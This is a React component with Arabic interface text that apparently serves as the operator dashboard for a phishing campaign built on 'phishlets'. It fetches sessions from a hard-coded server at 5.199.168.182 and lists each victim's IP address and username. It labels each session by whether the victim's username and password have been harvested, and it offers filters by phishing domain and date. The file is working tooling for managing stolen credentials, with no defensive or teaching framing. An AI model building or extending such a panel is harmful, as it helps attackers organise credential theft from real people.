import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import axios from 'axios';
import {
  Paper,
  Typography,
  Box,
  Grid,
  TextField,
  Button,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Chip,
  CircularProgress,
  Alert,
  MenuItem,
  IconButton,
  Tooltip,
  InputAdornment
} from '@mui/material';
import SearchIcon from '@mui/icons-material/Search';
import FilterListIcon from '@mui/icons-material/FilterList';
import VisibilityIcon from '@mui/icons-material/Visibility';
import ClearIcon from '@mui/icons-material/Clear';
import moment from 'moment';

const Sessions = () => {
  const [sessions, setSessions] = useState([]);
  const [filteredSessions, setFilteredSessions] = useState([]);
  const [domains, setDomains] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [showFilters, setShowFilters] = useState(false);
  const [filters, setFilters] = useState({
    domain: '',
    startDate: '',
    endDate: ''
  });

  useEffect(() => {
    const fetchSessions = async () => {
      try {
        const res = await axios.get('http://5.199.168.182:5000/api/sessions');
        setSessions(res.data.data);
        setFilteredSessions(res.data.data);
        
        // Extract unique domains
        const uniqueDomains = [...new Set(res.data.data.map(session => session.phishlet))];
        setDomains(uniqueDomains);
        
        setLoading(false);
      } catch (err) {
        setError(err.response?.data?.message || 'خطأ في جلب بيانات الجلسات');
        setLoading(false);
      }
    };

    fetchSessions();
  }, []);

  const handleFilterChange = (e) => {
    setFilters({ ...filters, [e.target.name]: e.target.value });
  };

  const applyFilters = async () => {
    setLoading(true);
    
    try {
      // If filters are empty, reset to all sessions
      if (!filters.domain && !filters.startDate && !filters.endDate) {
        setFilteredSessions(sessions);
        setLoading(false);
        return;
      }
      
      // Otherwise, apply filters through API
      const res = await axios.post('http://5.199.168.182:5000/api/sessions/filter', filters);
      setFilteredSessions(res.data.data);
    } catch (err) {
      setError(err.response?.data?.message || 'خطأ في تطبيق الفلتر');
    } finally {
      setLoading(false);
    }
  };

  const resetFilters = () => {
    setFilters({
      domain: '',
      startDate: '',
      endDate: ''
    });
    setFilteredSessions(sessions);
  };

  const formatTimestamp = (timestamp) => {
    return moment(timestamp * 1000).format('YYYY-MM-DD HH:mm:ss');
  };

  const getSessionStatus = (session) => {
    if (session.username && session.password) {
      return { label: 'تم تجميع بيانات الدخول', color: 'success' };
    } else if (session.username) {
      return { label: 'تم تجميع اسم المستخدم', color: 'warning' };
    } else {
      return { label: 'زيارة فقط', color: 'info' };
    }
  };

  if (loading && sessions.length === 0) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', py: 5 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error && sessions.length === 0) {
    return (
      <Alert severity="error" sx={{ mt: 3 }}>
        {error}
      </Alert>
    );
  }

  return (
    <div>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Typography variant="h4" component="h1" gutterBottom>
          الجلسات النشطة
        </Typography>
        <Button
          startIcon={<FilterListIcon />}
          onClick={() => setShowFilters(!showFilters)}
          color={showFilters ? 'primary' : 'secondary'}
          variant={showFilters ? 'contained' : 'outlined'}
        >
          {showFilters ? 'إخفاء الفلاتر' : 'إظهار الفلاتر'}
        </Button>
      </Box>

      {/* Filters */}
      {showFilters && (
        <Paper sx={{ p: 3, mb: 3 }} elevation={2}>
          <Grid container spacing={2} alignItems="center">
            <Grid item xs={12} sm={3}>
              <TextField
                select
                label="النطاق"
                name="domain"
                fullWidth
                value={filters.domain}
                onChange={handleFilterChange}
                variant="outlined"
                InputProps={{
                  startAdornment: (
                    <InputAdornment position="start">
                      <SearchIcon />
                    </InputAdornment>
                  ),
                  endAdornment: filters.domain ? (
                    <InputAdornment position="end">
                      <IconButton size="small" onClick={() => setFilters({...filters, domain: ''})}>
                        <ClearIcon fontSize="small" />
                      </IconButton>
                    </InputAdornment>
                  ) : null
                }}
              >
                <MenuItem value="">الكل</MenuItem>
                {domains.map(domain => (
                  <MenuItem key={domain} value={domain}>{domain}</MenuItem>
                ))}
              </TextField>
            </Grid>
            <Grid item xs={12} sm={3}>
              <TextField
                label="من تاريخ"
                name="startDate"
                type="date"
                fullWidth
                value={filters.startDate}
                onChange={handleFilterChange}
                variant="outlined"
                InputLabelProps={{
                  shrink: true,
                }}
                InputProps={{
                  endAdornment: filters.startDate ? (
                    <InputAdornment position="end">
                      <IconButton size="small" onClick={() => setFilters({...filters, startDate: ''})}>
                        <ClearIcon fontSize="small" />
                      </IconButton>
                    </InputAdornment>
                  ) : null
                }}
              />
            </Grid>
            <Grid item xs={12} sm={3}>
              <TextField
                label="إلى تاريخ"
                name="endDate"
                type="date"
                fullWidth
                value={filters.endDate}
                onChange={handleFilterChange}
                variant="outlined"
                InputLabelProps={{
                  shrink: true,
                }}
                InputProps={{
                  endAdornment: filters.endDate ? (
                    <InputAdornment position="end">
                      <IconButton size="small" onClick={() => setFilters({...filters, endDate: ''})}>
                        <ClearIcon fontSize="small" />
                      </IconButton>
                    </InputAdornment>
                  ) : null
                }}
              />
            </Grid>
            <Grid item xs={12} sm={3}>
              <Box sx={{ display: 'flex', gap: 1 }}>
                <Button
                  variant="contained"
                  color="primary"
                  onClick={applyFilters}
                  disabled={loading}
                  sx={{ flex: 1 }}
                >
                  {loading ? <CircularProgress size={24} /> : 'تطبيق'}
                </Button>
                <Button
                  variant="outlined"
                  onClick={resetFilters}
                  disabled={loading}
                >
                  إعادة ضبط
                </Button>
              </Box>
            </Grid>
          </Grid>
        </Paper>
      )}

      {/* Sessions Table */}
      {filteredSessions.length > 0 ? (
        <TableContainer component={Paper}>
          <Table>
            <TableHead>
              <TableRow>
                <TableCell>#</TableCell>
                <TableCell>النطاق</TableCell>
                <TableCell>التاريخ</TableCell>
                <TableCell>عنوان IP</TableCell>
                <TableCell>المستخدم</TableCell>
                <TableCell>الحالة</TableCell>
                <TableCell>الإجراءات</TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {filteredSessions.map((session) => {
                const status = getSessionStatus(session);
                
                return (
                  <TableRow key={session.id}>
                    <TableCell>{session.id}</TableCell>
                    <TableCell>{session.phishlet}</TableCell>
                    <TableCell>{formatTimestamp(session.create_time)}</TableCell>
                    <TableCell>{session.remote_addr}</TableCell>
                    <TableCell>
                      {session.username || <Typography variant="body2" color="text.secondary">-</Typography>}
                    </TableCell>
                    <TableCell>
                      <Chip
                        label={status.label}
                        color={status.color}
                        size="small"
                      />
                    </TableCell>
                    <TableCell>
                      <Tooltip title="عرض التفاصيل">
                        <IconButton
                          component={Link}
                          to={`/sessions/${session.id}`}
                          size="small"
                          color="primary"
                        >
                          <VisibilityIcon />
                        </IconButton>
                      </Tooltip>
                    </TableCell>
                  </TableRow>
                );
              })}
            </TableBody>
          </Table>
        </TableContainer>
      ) : (
        <Alert severity="info">لا توجد جلسات مطابقة للفلتر</Alert>
      )}
    </div>
  );
};

export default Sessions; 